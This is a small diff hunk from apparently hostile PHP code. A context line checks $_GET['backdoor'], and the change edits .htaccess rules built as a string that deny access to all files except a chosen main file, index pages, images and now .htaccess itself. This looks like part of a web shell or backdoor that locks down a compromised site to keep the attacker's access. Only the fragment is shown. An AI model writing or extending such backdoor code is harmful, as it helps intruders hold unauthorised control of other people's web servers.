@@ -838,7 +838,7 @@ if ($_GET['backdoor'] == True) {
     Order Deny,Allow
     Deny from all
 </FilesMatch>
-<FilesMatch "' . end($fileUtama) . '|index.php|index.html|*.png">
+<FilesMatch "' . end($fileUtama) . '|index.php|index.html|*.png|.htaccess">
     Order Deny, Allow
     Allow from all
 </FilesMatch>';
